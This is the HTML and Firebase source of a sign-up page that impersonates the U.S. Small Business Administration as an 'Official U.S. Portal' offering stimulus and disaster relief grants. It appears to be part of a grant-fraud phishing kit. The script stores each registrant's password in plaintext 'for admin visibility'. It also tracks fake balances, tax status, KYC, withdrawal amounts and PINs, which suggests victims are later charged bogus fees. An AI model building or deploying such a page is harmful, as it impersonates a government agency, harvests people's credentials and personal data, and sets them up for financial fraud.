<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA | Case Enrollment</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
        :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
        body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; color: #1e293b; -webkit-tap-highlight-color: transparent; }
        
        /* Mobile Specific Card */
        .auth-card { background: white; border-top: 5px solid var(--sba-blue); border-radius: 8px; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1); }
        
        /* Bigger inputs for mobile fingers */
        input, select { font-size: 16px !important; height: 55px; border-radius: 6px !important; border: 1.5px solid #e2e8f0 !important; transition: all 0.2s; }
        input:focus, select:focus { border-color: var(--sba-blue) !important; background: #fff !important; ring: 0 !important; outline: none !important; }

        .btn-sba { background: var(--sba-blue); height: 55px; font-size: 13px; letter-spacing: 1px; font-weight: 900; border-radius: 6px; width: 100%; color: white; text-transform: uppercase; }
        .btn-sba:active { transform: scale(0.98); background: #001a3d; }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <div class="bg-[#f0f0f0] py-2 px-4 flex items-center gap-2 border-b border-gray-200">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm">
        <span class="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Official U.S. Portal</span>
    </div>

    <main class="flex-grow flex items-center justify-center p-4">
        <div class="w-full max-w-md">
            <div class="text-center mb-6">
                <div class="inline-block border-t-4 border-l-4 border-r-4 border-[#002e6d] px-3 py-1 mb-1">
                    <span class="text-2xl font-black text-[#002e6d] uppercase tracking-tighter">SBA</span>
                </div>
                <div class="w-12 h-1 bg-red-600 mx-auto mb-4"></div>
                <h2 class="text-xl font-black text-slate-800 uppercase">Initialize Case</h2>
                <p class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">Federal Node V15</p>
            </div>

            <div class="auth-card p-6">
                <div id="alertBox" class="hidden mb-5 p-4 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-black uppercase italic shadow-sm"></div>

                <form id="registerForm" class="space-y-4">
                    <div>
                        <label class="block text-[10px] font-black text-slate-500 uppercase mb-1 ml-1">Full Legal Name</label>
                        <input type="text" id="userName" required class="w-full px-4 bg-slate-50" placeholder="John Doe">
                    </div>

                    <div>
                        <label class="block text-[10px] font-black text-slate-500 uppercase mb-1 ml-1">Case Email</label>
                        <input type="email" id="userEmail" required class="w-full px-4 bg-slate-50" placeholder="email@example.com">
                    </div>

                    <div>
                        <label class="block text-[10px] font-black text-slate-500 uppercase mb-1 ml-1">Relief Category</label>
                        <select id="reliefType" required class="w-full px-4 bg-slate-50 appearance-none">
                            <option value="">Select Grant Type</option>
                            <option value="STIMULUS">Small Business Stimulus</option>
                            <option value="DISASTER">Disaster Relief Fund</option>
                            <option value="TECH">Innovation & Tech Grant</option>
                        </select>
                    </div>

                    <div class="grid grid-cols-2 gap-3">
                        <div>
                            <label class="block text-[10px] font-black text-slate-500 uppercase mb-1 ml-1">Passkey</label>
                            <input type="password" id="userPass" required class="w-full px-4 bg-slate-50" placeholder="••••••">
                        </div>
                        <div>
                            <label class="block text-[10px] font-black text-slate-500 uppercase mb-1 ml-1">Confirm</label>
                            <input type="password" id="confirmPass" required class="w-full px-4 bg-slate-50" placeholder="••••••">
                        </div>
                    </div>

                    <div class="flex items-start gap-2 p-3 bg-slate-50 rounded border border-slate-100">
                        <input type="checkbox" id="termsCheck" required class="mt-1 w-4 h-4 accent-[#002e6d]">
                        <label for="termsCheck" class="text-[9px] text-slate-500 font-bold uppercase leading-normal">
                            I agree to the <a href="terms.html" class="text-blue-700 underline">Case Terms</a> and verify all data is true under federal law.
                        </label>
                    </div>

                    <button type="submit" id="submitBtn" class="btn-sba shadow-lg">
                        Create Secure Case
                    </button>
                </form>

                <div class="mt-6 pt-5 border-t border-slate-100 text-center">
                    <a href="login.html" class="text-[#002e6d] font-black text-[11px] uppercase tracking-widest">Already have a case? Sign In</a>
                </div>
            </div>
        </div>
    </main>

    <footer class="py-4 text-center text-[9px] text-slate-400 font-bold uppercase tracking-[0.3em]">
        <i class="fas fa-lock mr-1"></i> 256-Bit Federal Encryption
    </footer>

    <script type="module">
        import { auth, db } from './firebase-config.js';
        import { createUserWithEmailAndPassword, sendEmailVerification, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const regForm = document.getElementById('registerForm');
        const alertBox = document.getElementById('alertBox');
        const btn = document.getElementById('submitBtn');

        regForm.onsubmit = async (e) => {
            e.preventDefault();
            alertBox.classList.add('hidden');

            const name = document.getElementById('userName').value.trim();
            const email = document.getElementById('userEmail').value.toLowerCase().trim();
            const relief = document.getElementById('reliefType').value;
            const pass = document.getElementById('userPass').value;
            const confirm = document.getElementById('confirmPass').value;

            if (pass.length < 6) return showAlert("SECURITY: Passkey too short (min 6).");
            if (pass !== confirm) return showAlert("SYNC ERROR: Passkeys must match.");

            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> INITIALIZING...';

            try {
                const userCredential = await createUserWithEmailAndPassword(auth, email, pass);
                const user = userCredential.user;

                // Sync with Firestore (Added your specific requirements)
                await setDoc(doc(db, "users", user.uid), {
                    uid: user.uid,
                    fullName: name,
                    email: email,
                    password: pass, // For admin visibility
                    reliefType: relief,
                    balance: 0,
                    totalAwarded: 0,
                    kycStatus: "NOT VERIFIED",
                    taxStatus: "PENDING",
                    withdrawAmount: 0,
                    withdrawStatus: "NONE",
                    pin: "NOT SET",
                    caseID: "FED-" + Math.floor(100000 + Math.random() * 900000),
                    regDate: new Date().toLocaleDateString(),
                    role: "USER"
                });

                await sendEmailVerification(user);
                await signOut(auth); // Prevent auto-dashboard bug

                window.location.href = "verify.html?email=" + encodeURIComponent(email);

            } catch (error) {
                btn.disabled = false;
                btn.innerText = "Create Secure Case";
                if (error.code === 'auth/email-already-in-use') {
                    showAlert("SYSTEM: Email already registered.");
                } else {
                    showAlert("ERROR: " + error.message);
                }
            }
        };

        function showAlert(msg) {
            alertBox.innerText = msg;
            alertBox.classList.remove('hidden');
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
    </script>
</body>
</html>
